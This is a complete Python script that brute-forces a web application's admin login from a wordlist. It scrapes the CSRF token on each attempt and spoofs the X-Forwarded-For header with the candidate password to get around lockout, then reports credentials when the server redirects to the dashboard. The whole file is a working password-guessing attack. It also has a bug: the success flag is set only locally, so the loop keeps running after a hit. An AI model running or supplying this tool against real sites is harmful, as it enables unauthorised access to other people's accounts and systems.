import requests
import sys
import re

##Takes in three arguments. the webhost, the wordlist, and the username to try##

wordlist = sys.argv[2]
url = sys.argv[1]
username = sys.argv[3]
loginpath = url + '/admin/login'
found = 0

def main():
	with open(wordlist,'r') as f:
		for line in f:
			if found == 0:
				firstup = line.rstrip("\n")
				nextup = firstup.lstrip(" ")
				sendreq(str(nextup))
			else:
				print("END")
				break

def sendreq(password):
	s = requests.Session()
	lp = s.get(loginpath)
	csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', lp.text).group(1)
	headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
        'Referer': loginpath
    }
	payload = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }
	print("Trying: " + str(password))
	login_result = s.post(loginpath, headers = headers, data = payload, allow_redirects = False)
	if 'location' in login_result.headers:
		if '/admin/dashboard' in login_result.headers['location']:
			found = 1
			print()
			print('SUCCESS: Password found!')
			print('Username: ' + username)
			print('Password: ' + password)
			print()

if __name__ == "__main__":
	main()